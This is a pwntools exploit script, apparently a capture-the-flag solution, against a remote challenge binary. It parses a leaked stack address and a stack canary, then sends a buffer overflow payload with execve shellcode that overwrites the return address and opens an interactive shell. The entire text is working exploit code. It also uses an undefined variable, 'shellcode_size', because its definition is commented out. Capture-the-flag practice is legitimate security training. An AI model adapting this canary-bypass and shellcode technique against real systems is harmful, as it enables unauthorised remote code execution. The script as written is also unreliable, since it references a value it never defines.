from pwn import * 

binary = "./program"
context.arch = 'amd64'
#p = process(binary)
p = remote("chal.firebird.sh", 35028)
context.log_level = 'debug'
#s = 'b* UwU_main+546'
#gdb.attach(p, s)
p.recvuntil("0x")
leak_addr = int(b'0x' + p.recvuntil(b' ', drop = True), 16)
shellcode_addr = leak_addr + 0x18 + 8 + 8
p.recvuntil("0x")
canary = int(b'0x' + p.recvuntil(b' ', drop = True), 16)

#print(hex(canary))
#p.sendlineafter("how long is your shellcode?", b'48')

shellcode_addr = leak_addr + 0x18 + 8 + 8

print(f"Leaked address: {hex(leak_addr)}")
print(f"Canary: {hex(canary)}")


shellcode = asm("""
xor rsi, rsi            
xor rdx, rdx
mov rdi, rcx            
mov al, 0x3b            
syscall           
""")

payload = flat(
    b'/bin/sh\x00',
    p64(canary),
    b"A" * 0x8, # old_rbp
    p64(shellcode_addr),      # old_rip -> address of shellcode_size
    shellcode
)




p.recvuntil(b"how long is your shellcode?\n")
p.sendline(str(shellcode_size).encode())

p.recvuntil(b"Show me your shellcode!\n")
p.sendline(payload)
p.interactive()